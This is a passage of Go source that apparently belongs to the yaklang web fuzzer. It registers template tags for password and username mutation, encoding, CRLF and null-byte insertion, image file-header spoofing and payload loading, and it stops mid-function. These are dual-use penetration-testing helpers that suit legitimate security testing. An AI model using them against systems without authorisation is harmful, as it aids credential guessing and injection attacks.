package mutate

import (
	"context"
	"encoding/base64"
	"errors"
	"fmt"
	"io/fs"
	"io/ioutil"
	"math/rand"
	"os"
	"strconv"
	"strings"
	"time"
	_ "time/tzdata"

	"github.com/yaklang/yaklang/common/jsonpath"
	"github.com/yaklang/yaklang/common/utils/bizhelper"
	"github.com/yaklang/yaklang/common/utils/filesys"

	cryptoRand "crypto/rand"

	"github.com/google/uuid"
	"github.com/samber/lo"
	"github.com/yaklang/yaklang/common/consts"
	"github.com/yaklang/yaklang/common/filter"
	"github.com/yaklang/yaklang/common/fuzztagx/parser"
	"github.com/yaklang/yaklang/common/schema"
	"github.com/yaklang/yaklang/common/utils/dateparse"
	"github.com/yaklang/yaklang/common/utils/regen"
	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
	"github.com/yaklang/yaklang/common/yso"

	"github.com/yaklang/yaklang/common/fuzztag"
	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/utils/big"
)

const puncSet = `<>?,./:";'{}[]|\_+-=)(*&^%$#@!'"` + "`"

// 空内容
var fuzztagfallback = []string{""}

type FuzzTagDescription struct {
	TagName               string
	TagNameVerbose        string
	Handler               func(string) []string
	HandlerEx             func(string) []*fuzztag.FuzzExecResult
	HandlerAndYield       func(context.Context, string, func(res *parser.FuzzResult)) error
	HandlerAndYieldString func(s string, yield func(s string)) error
	ErrorInfoHandler      func(string) ([]string, error)
	IsDyn                 bool
	IsFlowControl         bool
	IsDynFun              func(name, params string) bool
	Alias                 []string
	Description           string
	ArgumentDescription   string
	Examples              []string
	ArgumentTypes         []*FuzztagArgumentType
}

func AddFuzzTagDescriptionToMap(methodMap map[string]*parser.TagMethod, f *FuzzTagDescription) {
	if f == nil {
		return
	}
	name := f.TagName
	alias := f.Alias
	var expand map[string]any
	if f.IsDynFun != nil {
		expand = map[string]any{
			"IsDynFun": f.IsDynFun,
		}
	}
	if f.HandlerAndYieldString != nil {
		f.HandlerAndYield = func(ctx context.Context, s string, yield func(res *parser.FuzzResult)) error {
			return f.HandlerAndYieldString(s, func(s string) {
				yield(parser.NewFuzzResultWithData(s))
			})
		}
	}
	if f.HandlerAndYield != nil {
		methodMap[name] = &parser.TagMethod{
			Name:          name,
			IsDyn:         f.IsDyn,
			IsFlowControl: f.IsFlowControl,
			Expand:        expand,
			Alias:         alias,
			Description:   f.Description,
			YieldFun: func(ctx context.Context, s string, recv func(*parser.FuzzResult)) error {
				return f.HandlerAndYield(ctx, s, recv)
			},
		}
	} else {
		methodMap[name] = &parser.TagMethod{
			Name:          name,
			IsDyn:         f.IsDyn,
			IsFlowControl: f.IsFlowControl,
			Expand:        expand,
			Alias:         alias,
			Description:   f.Description,
			Fun: func(s string) (result []*parser.FuzzResult, err error) {
				defer func() {
					if r := recover(); r != nil {
						if v, ok := r.(error); ok {
							err = v
						} else {
							err = errors.New(utils.InterfaceToString(r))
						}
					}
				}()
				if f.Handler != nil {
					for _, d := range f.Handler(s) {
						result = append(result, parser.NewFuzzResultWithData(d))
					}
				} else if f.HandlerEx != nil {
					for _, data := range f.HandlerEx(s) {
						var verbose string
						showInfo := data.ShowInfo()
						if len(showInfo) != 0 {
							verbose = utils.InterfaceToString(showInfo)
						}
						result = append(result, parser.NewFuzzResultWithDataVerbose(data.Data(), verbose))
					}
				} else if f.ErrorInfoHandler != nil {
					res, err := f.ErrorInfoHandler(s)
					fuzzRes := []*parser.FuzzResult{}
					for _, r := range res {
						fuzzRes = append(fuzzRes, parser.NewFuzzResultWithData(r))
					}
					return fuzzRes, err
				} else {
					return nil, errors.New("no handler")
				}
				return
			},
		}
	}
	for _, a := range alias {
		methodMap[a] = methodMap[name]
	}
}

var (
	existedFuzztag []*FuzzTagDescription
	tagMethodMap   = map[string]*parser.TagMethod{}
)

func GetAllFuzztags() []*FuzzTagDescription {
	return existedFuzztag
}

func GetFuzztagMaxLength(tags []*FuzzTagDescription) int {
	maxTagNameLength := 0
	lo.ForEach(tags, func(item *FuzzTagDescription, index int) {
		if len(item.TagName) > maxTagNameLength {
			maxTagNameLength = len(item.TagName)
		}
		lo.ForEach(item.Alias, func(alias string, index int) {
			if len(alias) > maxTagNameLength {
				maxTagNameLength = len(alias)
			}
		})
	})
	return maxTagNameLength
}

func GetExistedFuzzTagMap() map[string]*parser.TagMethod {
	if tagMethodMap == nil {
		tagMethodMap = map[string]*parser.TagMethod{}
	}
	return tagMethodMap
}

func AddFuzzTagToGlobal(f *FuzzTagDescription) {
	if f.ArgumentDescription != "" {
		ex, err := GenerateExampleTags(f)
		if err != nil {
			log.Errorf("generate example tags error: %v", err)
		} else {
			f.Examples = ex
		}
		typs, err := ParseFuzztagArgumentTypes(f.ArgumentDescription)
		if err != nil {
			log.Errorf("parse fuzztag argument types error: %v", err)
		} else {
			f.ArgumentTypes = typs
		}
	} else {
		f.Examples = []string{fmt.Sprintf("{{%s()}}", f.TagName)}
	}

	existedFuzztag = append(existedFuzztag, f)
	AddFuzzTagDescriptionToMap(tagMethodMap, f)
}

func tryYield(ctx context.Context, yield func(res *parser.FuzzResult), data string) error {
	select {
	case <-ctx.Done():
		return ctx.Err()
	default:
		yield(parser.NewFuzzResultWithData(data))
		return nil
	}
}

func init() {
	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "substr",
		Handler: func(s string) []string {
			index := strings.LastIndexByte(s, '|')
			if index == -1 {
				return []string{s}
			}
			before, after := s[:index], s[index+1:]
			if strings.Contains(after, ",") {
				start, length := sepToEnd(after, ",")
				startInt := codec.Atoi(start)
				lengthInt := codec.Atoi(length)
				if lengthInt <= 0 {
					lengthInt = len(before)
				}
				if startInt >= len(before) {
					return []string{""}
				}
				if startInt+lengthInt >= len(before) {
					return []string{before[startInt:]}
				}
				return []string{before[startInt : startInt+lengthInt]}
			} else {
				start := codec.Atoi(after)
				if len(before) > start {
					return []string{before[start:]}
				}
				return []string{""}
			}
		},
		Description:         "截取字符串tag，输出一个字符串的子符串。",
		TagNameVerbose:      "截取字符串",
		ArgumentDescription: "{{string_split(abc:数据)}}{{number(0:起始位置)}}{{optional(number(3:长度))}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "fuzz:username",
		HandlerAndYield: func(ctx context.Context, s string, yield func(res *parser.FuzzResult)) error {
			origin, levelString := sepToEnd(s, "|")
			level := 1
			if levelInt, err := strconv.Atoi(levelString); err != nil {
				origin = s
			} else {
				level = levelInt
			}
			fuzzuserWithCallback(origin, level, func(s string) bool {
				err := tryYield(ctx, yield, s)
				return err != nil
			})
			return nil
		},
		Alias:               []string{"fuzz:user"},
		Description:         "根据给定的用户名列表生成更多用于模糊测试的用户名",
		TagNameVerbose:      "模糊测试用户名",
		ArgumentDescription: "{{list(string_split(admin:用户名))}}{{optional(enum({{number(1:1级)}}{{number(2:2级)}}{{number(3:3级)}}:1:等级))}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "fuzz:password",
		HandlerAndYield: func(ctx context.Context, s string, yield func(res *parser.FuzzResult)) error {
			origin, levelString := sepToEnd(s, "|")
			level := 1
			if levelInt, err := strconv.Atoi(levelString); err != nil {
				origin = s
			} else {
				level = levelInt
			}
			fuzzpassWithCallback(origin, level, func(s string) bool {
				err := tryYield(ctx, yield, s)
				return err != nil
			})
			return nil
		},
		Alias:               []string{"fuzz:pass"},
		Description:         "根据给定的密码列表生成更多用于模糊测试的密码",
		TagNameVerbose:      "模糊测试密码",
		ArgumentDescription: "{{list(string_split(password:密码))}}{{optional(enum({{number(1:1级)}}{{number(2:2级)}}{{number(3:3级)}}:1:等级))}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "unicode:encode",
		Handler: func(s string) []string {
			res := codec.JsonUnicodeEncode(s)
			return []string{
				string(res),
			}
		},
		Alias:               []string{"unicode", "unicode:enc"},
		Description:         "Unicode 编码，把标签内容进行 Unicode 编码",
		TagNameVerbose:      "Unicode 编码",
		ArgumentDescription: "{{string(abc:字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "unicode:decode",
		Handler: func(s string) []string {
			res := codec.JsonUnicodeDecode(s)
			return []string{
				string(res),
			}
		},
		Alias:               []string{"unicode:dec"},
		TagNameVerbose:      "Unicode 解码",
		ArgumentDescription: "{{string(abc:字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "zlib:encode",
		Handler: func(s string) []string {
			res, _ := utils.ZlibCompress(s)
			return []string{
				string(res),
			}
		},
		Alias:               []string{"zlib:enc", "zlibc", "zlib"},
		Description:         "Zlib 编码，把标签内容进行 zlib 压缩",
		TagNameVerbose:      "Zlib 编码",
		ArgumentDescription: "{{string(abc:字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "zlib:decode",
		Handler: func(s string) []string {
			res, _ := utils.ZlibDeCompress([]byte(s))
			return []string{
				string(res),
			}
		},
		Alias:               []string{"zlib:dec", "zlibdec", "zlibd"},
		Description:         "Zlib 解码，把标签内的内容进行 zlib 解码",
		TagNameVerbose:      "Zlib 解码",
		ArgumentDescription: "{{string(abc:字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "gzip:encode",
		Handler: func(s string) []string {
			res, _ := utils.GzipCompress(s)
			return []string{
				string(res),
			}
		},
		Alias:               []string{"gzip:enc", "gzipc", "gzip"},
		Description:         "Gzip 编码，把标签内容进行 gzip 压缩",
		TagNameVerbose:      "Gzip 编码",
		ArgumentDescription: "{{string(abc:字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "gzip:decode",
		Handler: func(s string) []string {
			res, _ := utils.GzipDeCompress([]byte(s))
			return []string{
				string(res),
			}
		},
		Alias:               []string{"gzip:dec", "gzipdec", "gzipd"},
		Description:         "Gzip 解码，把标签内的内容进行 gzip 解码",
		TagNameVerbose:      "Gzip 解码",
		ArgumentDescription: "{{string(abc:字符串)}}",
	})

	datetimeFuzzFuncGenerator := func(defaultFormat string) func(s string) []string {
		return func(s string) []string {
			if s == "" {
				return []string{utils.JavaTimeFormatter(time.Now(), defaultFormat)}
			}

			now := time.Now()
			splited := strings.Split(s, ",")
			if len(splited) > 1 {
				location, _ := time.LoadLocation(splited[1])
				now = now.In(location)
			}

			return []string{utils.JavaTimeFormatter(now, splited[0])}
		}
	}
	dateFuzzFunc := datetimeFuzzFuncGenerator("YYYY-MM-dd")

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "date",
		Handler: func(s string) []string {
			return dateFuzzFunc(s)
		},
		Description:         "生成并格式化一个当前时间，默认格式为YYYY-MM-dd，如：{{date(YYYY-MM-dd)}}，还可以再加一个参数指定时区，如：{{date(YYYY-MM-dd,Asia/Shanghai)}}",
		TagNameVerbose:      "生成日期",
		ArgumentDescription: "{{string(YYYY-MM-dd:日期格式)}}",
		IsDyn:               true,
	})

	datetimeFuzzFunc := datetimeFuzzFuncGenerator("YYYY-MM-dd HH:mm:ss")

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "datetime",
		Handler: func(s string) []string {
			return datetimeFuzzFunc(s)
		},
		Alias:               []string{"time"},
		Description:         "生成并格式化一个当前时间，默认格式为YYYY-MM-dd HH:mm:ss，如：{{datetime(YYYY-MM-dd HH:mm:ss)}}，还可以再加一个参数指定时区，如：{{datetime(YYYY-MM-dd HH:mm:ss,Asia/Shanghai)}}",
		TagNameVerbose:      "生成时间",
		ArgumentDescription: "{{string(YYYY-MM-dd HH:mm:ss:日期时间格式)}}",
		IsDyn:               true,
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "date:range",
		HandlerAndYield: func(ctx context.Context, s string, yield func(res *parser.FuzzResult)) error {
			splited := strings.Split(s, ",")
			if len(splited) == 1 {
				yield(parser.NewFuzzResultWithData(s))
				return nil
			}

			start, end := splited[0], splited[1]
			location := time.Local
			if len(splited) == 3 {
				location, _ = time.LoadLocation(splited[2])
			}

			layout, err := dateparse.ParseFormat(start)
			if err != nil {
				return nil
			}

			startTime, err := dateparse.ParseIn(start, location)
			if err != nil {
				return nil
			}
			endTime, err := dateparse.ParseIn(end, location)
			if err != nil {
				return nil
			}

			if startTime.After(endTime) {
				return nil
			}

			for startTime.Compare(endTime) <= 0 {
				err := tryYield(ctx, yield, startTime.Format(layout))
				if err != nil {
					return err
				}

				startTime = startTime.AddDate(0, 0, 1)
			}
			return nil
		},
		Description:         "以逗号为分隔，尝试根据输入的两个时间生成一个时间段，如：{{date:range(20080101,20090101)}}。还可以再加一个参数指定时区，如：{{date:range(20080101,20090101,Asia/Shanghai)}}",
		TagNameVerbose:      "生成日期范围",
		ArgumentDescription: "{{string(20080101:开始时间)}}{{string(20090101:结束时间)}}{{optional(string(Asia/Shanghai:时区))}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "timestamp",
		IsDyn:   true,
		Handler: func(s string) []string {
			switch strings.ToLower(s) {
			case "s", "sec", "seconds", "second":
				return []string{fmt.Sprint(time.Now().Unix())}
			case "ms", "milli", "millis", "millisecond", "milliseconds":
				return []string{fmt.Sprint(time.Now().UnixMilli())}
			case "us", "micro", "micros", "microsecond", "microseconds":
				return []string{fmt.Sprint(time.Now().UnixMicro())}
			case "ns", "nano", "nanos", "nanosecond", "nanoseconds":
				return []string{fmt.Sprint(time.Now().UnixNano())}
			}
			return []string{fmt.Sprint(time.Now().Unix())}
		},
		Description:         "生成一个时间戳，默认单位为秒，可指定单位：s, ms, us, ns: {{timestamp(s)}}",
		TagNameVerbose:      "生成时间戳",
		ArgumentDescription: "{{enum({{string(s:秒)}}{{string(ms:毫秒)}}{{string(us:微秒)}}{{string(ns:纳秒)}}:ms:单位)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "uuid",
		Handler: func(s string) []string {
			result := []string{}
			for i := 0; i < atoi(s); i++ {
				result = append(result, uuid.New().String())
			}
			if len(result) == 0 {
				return []string{uuid.New().String()}
			}
			return result
		},
		Description:         "生成一个随机的uuid，如果指定了数量，将生成指定数量的uuid",
		TagNameVerbose:      "生成UUID",
		ArgumentDescription: "{{optional(number(1:数量))}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "null",
		HandlerAndYield: func(ctx context.Context, s string, yield func(res *parser.FuzzResult)) error {
			n := 1
			if ret := atoi(s); ret > 0 {
				n = ret
			}
			for i := 0; i < n; i++ {
				err := tryYield(ctx, yield, "\x00")
				if err != nil {
					return err
				}
			}
			return nil
		},
		Alias:               []string{"nullbyte"},
		Description:         "生成一个空字节，如果指定了数量，将生成指定数量的空字节 {{null(5)}} 表示生成 5 个空字节",
		TagNameVerbose:      "生成空字节",
		ArgumentDescription: "{{optional(number(1:数量))}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "crlf",
		HandlerAndYield: func(ctx context.Context, s string, yield func(res *parser.FuzzResult)) error {
			n := 1
			if ret := atoi(s); ret > 0 {
				n = ret
			}
			for i := 0; i < n; i++ {
				err := tryYield(ctx, yield, "\r\n")
				if err != nil {
					return err
				}
			}
			return nil
		},
		Description:         "生成一个 CRLF，如果指定了数量，将生成指定数量的 CRLF {{crlf(5)}} 表示生成 5 个 CRLF",
		TagNameVerbose:      "生成CRLF",
		ArgumentDescription: "{{optional(number(1:数量))}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "gb18030",
		Handler: func(s string) []string {
			g, err := codec.Utf8ToGB18030([]byte(s))
			if err != nil {
				return []string{s}
			}
			return []string{string(g)}
		},
		Description:         `将字符串转换为 GB18030 编码，例如：{{gb18030(你好)}}`,
		TagNameVerbose:      "GB18030编码",
		ArgumentDescription: "{{string(你好:字符串)}}",
	})
	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "gb18030toUTF8",
		Handler: func(s string) []string {
			g, err := codec.GB18030ToUtf8([]byte(s))
			if err != nil {
				return []string{s}
			}
			return []string{string(g)}
		},
		Description:         `将字符串转换为 UTF8 编码，例如：{{gb18030toUTF8({{hexd(c4e3bac3)}})}}`,
		TagNameVerbose:      "GB18030转UTF8",
		ArgumentDescription: "{{string(你好:字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "padding:zero",
		Handler: func(s string) []string {
			origin, paddingTotal := sepToEnd(s, "|")
			left := strings.HasPrefix(paddingTotal, "-")
			paddingTotal = strings.TrimLeft(paddingTotal, "-+")
			if ret := atoi(paddingTotal); ret > 0 {
				if left {
					return []string{
						strings.Repeat("0", ret-len(origin)) + origin,
					}
				}
				return []string{
					origin + strings.Repeat("0", ret-len(origin)),
				}
			}
			return []string{origin}
		},
		Alias:               []string{"zeropadding", "zp"},
		Description:         "使用0来填充补偿字符串长度不足的问题，{{zeropadding(abc|5)}} 表示将 abc 填充到长度为 5 的字符串（00abc），{{zeropadding(abc|-5)}} 表示将 abc 填充到长度为 5 的字符串，并且在右边填充 (abc00)",
		TagNameVerbose:      "0填充",
		ArgumentDescription: "{{string_split(abc:原始字符串)}}{{number(5:填充长度,如果是负数则向左填充)}}",
	})
	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "padding:null",
		Handler: func(s string) []string {
			origin, paddingTotal := sepToEnd(s, "|")
			right := strings.HasPrefix(paddingTotal, "-")
			paddingTotal = strings.TrimLeft(paddingTotal, "-+")
			if ret := atoi(paddingTotal); ret > 0 {
				if right {
					return []string{
						strings.Repeat("\x00", ret-len(origin)) + origin,
					}
				}
				return []string{
					strings.Repeat("\x00", ret-len(origin)) + origin,
				}
			}
			return []string{origin}
		},
		Alias:               []string{"nullpadding", "np"},
		Description:         "使用 \\x00 来填充补偿字符串长度不足的问题，{{nullpadding(abc|5)}} 表示将 abc 填充到长度为 5 的字符串（\\x00\\x00abc），{{nullpadding(abc|-5)}} 表示将 abc 填充到长度为 5 的字符串，并且在右边填充 (abc\\x00\\x00)",
		TagNameVerbose:      "空字节填充",
		ArgumentDescription: "{{string_split(abc:原始字符串)}}{{number(5:填充长度,如果是负数则向左填充)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "char",
		HandlerAndYield: func(ctx context.Context, s string, yield func(res *parser.FuzzResult)) error {
			if s == "" {
				return tryYield(ctx, yield, "")
			}

			if !strings.Contains(s, "-") {
				return tryYield(ctx, yield, "")
			}

			ret := strings.Split(s, "-")
			switch len(ret) {
			case 2:
				p1, p2 := ret[0], ret[1]
				if !(len(p1) == 1 && len(p2) == 1) {
					log.Errorf("start char or end char is not char(1 byte): %v eg.: %v", s, "a-z")
					return tryYield(ctx, yield, "")
				}

				p1Byte := []byte(p1)[0]
				p2Byte := []byte(p2)[0]
				var rets []string
				min, max := utils.MinByte(p1Byte, p2Byte), utils.MaxByte(p1Byte, p2Byte)
				for i := min; i <= max; i++ {
					rets = append(rets, string(i))
					if err := tryYield(ctx, yield, string(i)); err != nil {
						return err
					}
				}
			default:
				log.Errorf("bad params[%s], eg.: %v", s, "a-z")
				return tryYield(ctx, yield, "")
			}

			return nil
		},
		Alias:               []string{"c", "ch"},
		Description:         "生成字符，例如：`{{char(a-z)}}`, 结果为 [a b c ... x y z]",
		TagNameVerbose:      "生成字符",
		ArgumentDescription: "{{string(a-z:字符范围)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName:       "repeat",
		IsFlowControl: true,
		HandlerAndYield: func(ctx context.Context, s string, yield func(res *parser.FuzzResult)) error {
			i := atoi(s)
			if i == 0 {
				chr, right := sepToEnd(s, "|")
				if repeatTimes := atoi(right); repeatTimes > 0 {
					for j := 0; j < repeatTimes; j++ {
						if err := tryYield(ctx, yield, chr); err != nil {
							return err
						}
					}
				} else {
					return tryYield(ctx, yield, "")
				}
			} else {
				for j := 0; j < i; j++ {
					if err := tryYield(ctx, yield, ""); err != nil {
						return err
					}
				}
			}
			return nil
		},
		Description:         "生成字符串数组，例如：`{{repeat(abc|3)}}` 会产生 `['abc','abc','abc']`；若写成 `{{repeat(3)}}` 则产生 `['','','']`。在 WebFuzzer 中，可通过 `{{repeat(n)}}` 指定重复发送 n 个包。",
		TagNameVerbose:      "生成字符串数组",
		ArgumentDescription: "{{optional(string_split(abc:字符串))}}{{number(3:重复次数)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "repeat:range",
		HandlerAndYield: func(ctx context.Context, s string, yield func(res *parser.FuzzResult)) error {
			origin, times := sepToEnd(s, "|")
			if ret := atoi(times); ret > 0 {
				results := make([]string, ret+1)
				for i := 0; i < ret+1; i++ {
					if i == 0 {
						results[i] = ""
						continue
					}
					if err := tryYield(ctx, yield, strings.Repeat(origin, i)); err != nil {
						return err
					}
				}
				return nil
			}
			return tryYield(ctx, yield, s)
		},
		Description:         "重复一个字符串，并把重复步骤全都输出出来，例如：`{{repeat:range(abc|3)}}`，结果为：[abc abcabc abcabcabc]",
		TagNameVerbose:      "重复生成字符串列表",
		ArgumentDescription: "{{string_split(abc:字符串)}}{{number(3:重复次数)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "payload",
		HandlerAndYield: func(ctx context.Context, s string, yield func(res *parser.FuzzResult)) error {
			db := consts.GetGormProfileDatabase()
			if db == nil {
				return tryYield(ctx, yield, s)
			}
			for _, s := range utils.PrettifyListFromStringSplited(s, ",") {
				group, folder := "", ""
				ss := strings.Split(s, "/")
				if len(ss) == 2 {
					folder = ss[0]
					group = ss[1]
					if group == "*" {
						group = ""
					}
				} else {
					group = ss[0]
				}

				if group != "" && folder != "" {
					db = db.Or("`group` = ? AND `folder` = ?", group, folder)
				} else if group != "" {
					db = db.Or("`group` = ?", group)
				} else if folder != "" {
					db = db.Or("`folder` = ?", folder)
				}
			}

			ch := bizhelper.YieldModel[*schema.Payload](ctx, db.Select("content, is_file").Order("hit_count desc"))

			f := filter.NewBigFilter()
			defer f.Close()
			for payload := range ch {
				if payload.Content == nil || payload.IsFile == nil {
					continue
				}

				payloadRaw, isFile := payload.GetContent(), payload.GetIsFile()

				if isFile {
					ch, err := utils.FileLineReaderWithContext(payloadRaw, ctx)
					if err != nil {
						log.Errorf("read payload err: %v", err)
						continue
					}
					for line := range ch {
						lineStr := string(line)
						raw, err := strconv.Unquote(lineStr)
						if err == nil {
							lineStr = raw
						}
						if f.Exist(lineStr) {
							continue
						}
						f.Insert(lineStr)
						if err := tryYield(ctx, yield, lineStr); err != nil {
							return err
						}
					}
				} else {
					if f.Exist(payloadRaw) {
						continue
					}
					f.Insert(payloadRaw)
					if err := tryYield(ctx, yield, payloadRaw); err != nil {
						return err
					}
				}
			}
			return nil
		},
		Alias:               []string{"x"},
		Description:         "从数据库加载 Payload, 可以指定payload组或文件夹, `{{payload(groupName)}}`, `{{payload(folder/*)}}`",
		TagNameVerbose:      "加载Payload",
		ArgumentDescription: "{{string_split(groupName:组名或文件夹名)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName:     "array",
		Alias:       []string{"list"},
		Description: "设置一个数组，使用 `|` 分割，例如：`{{array(1|2|3)}}`，结果为：[1,2,3]，",
		HandlerAndYield: func(ctx context.Context, s string, yield func(res *parser.FuzzResult)) error {
			for _, s := range utils.PrettifyListFromStringSplited(s, "|") {
				if err := tryYield(ctx, yield, s); err != nil {
					return err
				}
			}
			return nil
		},
		TagNameVerbose:      "生成数组",
		ArgumentDescription: "{{list(string_split(a:字符串))}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName:     "array:comma",
		Alias:       []string{"list:comma"},
		Description: "设置一个数组，使用 `,` 分割，例如：`{{array(1,2,3)}}`，结果为：[1,2,3]，",
		HandlerAndYield: func(ctx context.Context, s string, yield func(res *parser.FuzzResult)) error {
			for _, s := range utils.PrettifyListFromStringSplited(s, ",") {
				if err := tryYield(ctx, yield, s); err != nil {
					return err
				}
			}
			return nil
		},
		TagNameVerbose:      "生成数组,逗号分割",
		ArgumentDescription: "{{list(string_dot(a:字符串))}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName:     "array:auto",
		Alias:       []string{"list:auto"},
		Description: "设置一个数组，使用 `,` 分割，例如：`{{array(1,2,3)}}`，结果为：[1,2,3]，",
		HandlerAndYield: func(ctx context.Context, s string, yield func(res *parser.FuzzResult)) error {
			for _, s := range utils.PrettifyListFromStringSplitEx(s, ",", "|") {
				if err := tryYield(ctx, yield, s); err != nil {
					return err
				}
			}
			return nil
		},
		TagNameVerbose:      "生成数组,自动分割",
		ArgumentDescription: "{{list(string_split_dot(a:字符串))}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName:     "trim",
		Description: "去除字符串两边的空格，一般配合其他 tag 使用，如：{{trim({{x(dict)}})}}",
		Handler: func(s string) []string {
			return []string{strings.TrimSpace(s)}
		},
		TagNameVerbose:      "去除空格",
		ArgumentDescription: "{{string(abc:字符串)}}",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName:             "ico",
		Handler:             func(s string) []string { return []string{"\x00\x00\x01\x00\x01\x00\x20\x20"} },
		Description:         "生成一个 ico 文件头，例如 `{{ico}}`",
		TagNameVerbose:      "生成ico文件头",
		ArgumentDescription: "",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "tiff",
		Handler: func(s string) []string {
			return []string{"\x4d\x4d", "\x49\x49"}
		},
		Description:         "生成一个 tiff 文件头，例如 `{{tiff}}`",
		TagNameVerbose:      "生成tiff文件头",
		ArgumentDescription: "",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName:             "bmp",
		Handler:             func(s string) []string { return []string{"\x42\x4d"} },
		Description:         "生成一个 bmp 文件头，例如 {{bmp}}",
		TagNameVerbose:      "生成bmp文件头",
		ArgumentDescription: "",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName:             "gif",
		Handler:             func(s string) []string { return []string{"GIF89a"} },
		Description:         "生成 gif 文件头",
		TagNameVerbose:      "生成gif文件头",
		ArgumentDescription: "",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "png",
		Handler: func(s string) []string {
			return []string{
				"\x89PNG" +
					"\x0d\x0a\x1a\x0a" +
					"\x00\x00\x00\x0D" +
					"IHDR\x00\x00\x00\xce\x00\x00\x00\xce\x08\x02\x00\x00\x00" +
					"\xf9\x7d\xaa\x93",
			}
		},
		Description:         "生成 PNG 文件头",
		TagNameVerbose:      "生成png文件头",
		ArgumentDescription: "",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "jpg",
		Handler: func(s string) []string {
			return []string{
				"\xff\xd8\xff\xe0\x00\x10JFIF" + s + "\xff\xd9",
				"\xff\xd8\xff\xe1\x00\x1cExif" + s + "\xff\xd9",
			}
		},
		Alias:               []string{"jpeg"},
		Description:         "生成 jpeg / jpg 文件头",
		TagNameVerbose:      "生成jpeg文件头",
		ArgumentDescription: "",
	})

	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "punctuation",
		HandlerAndYield: func(ctx context.Context, s string, yield func(res *parser.FuzzResult)) error {
			for _, s := range puncSet {
				if err := tryYield(ctx, yield, string(s)); err != nil {
					return err
				}
			}
			return nil
		},
		Alias:               []string{"punc"},
		Description:         "生成所有标点符号",
		TagNameVerbose:      "生成标点符号",
		ArgumentDescription: "",
	})
	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "regen",
		Handler: func(s string) []string {
			return regen.MustGenerate(s)
		},
		HandlerAndYield: func(ctx context.Context, s string, yield func(res *parser.FuzzResult)) error {
			ch, _, err := regen.GenerateStream(s, ctx)
			if err != nil {
				return err
			}

			for data := range ch {
				yield(parser.NewFuzzResultWithData(data))
			}
			return nil
		},
		Alias:               []string{"re", "regex", "regexp"},
		Description:         "使用正则生成所有可能的字符",
		TagNameVerbose:      "正则生成",
		ArgumentDescription: "{{string([a-z0-9]:正则表达式)}}",
	})
	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "regen:one",
		Handler: func(s string) []string {
			return []string{regen.MustGenerateOne(s)}
		},
		HandlerAndYield: func(ctx context.Context, s string, yield func(res *parser.FuzzResult)) error {
			data, err := regen.GenerateOneStream(s, ctx)
			if err != nil {
				return err
			}
			yield(parser.NewFuzzResultWithData(data))
			return nil
		},
		Alias:               []string{"re:one", "regex:one", "regexp:one"},
		Description:         "使用正则生成所有可能的字符中的随机一个",
		IsDyn:               true,
		TagNameVerbose:      "正则生成一条数据",
		ArgumentDescription: "{{string([a-z0-9]:正则表达式)}}",
	})
	AddFuzzTagToGlobal(&FuzzTagDescription{
		TagName: "regen:n",
		Handler: func(s string) []string {
			n := 1
			pattern := s
			lastIndex := strings.LastIndexByte(s, '|')

			if lastIndex > 0 && lastIndex+1 < len(s) {
				pattern = s[:lastIndex]
				number := s[lastIndex+1:]
				if ret := codec.Atoi(number); ret > 0 {
					n = ret
				}
			}
			results, err := regen.Generate(pattern)
			if err != nil {
				return []string{pattern}
			}
			rand.Shuffle(len(results), func(i, j int) {
				results[i], results[j] = results[j], results[i]
			})
			if n >= len(results) {
				return results
			} else {
				return results[:n]
			}
		},
		HandlerAndYield: func(ctx context.Context, s string, yield func(res *parser.FuzzResult)) error {
			n := 1
			pattern := s
			lastIndex := strings.LastIndexByte(s, '|')
			if lastIndex > 0 && lastIndex+1 < len(s) {
				pattern = s[:lastIndex]
				number := s[lastIndex+1:]
				if ret := codec.Atoi(number); ret > 0 {
					n = ret
				}
			}
			ch, cancel, err := regen.GenerateStream(pattern, ctx)
			if err != nil {
				return err
			}
			i := 0
			for data := range ch {
				i++
				yield(parser.NewFuzzResultWithData(data))
				if i >= n {
					cancel()
					break
				}
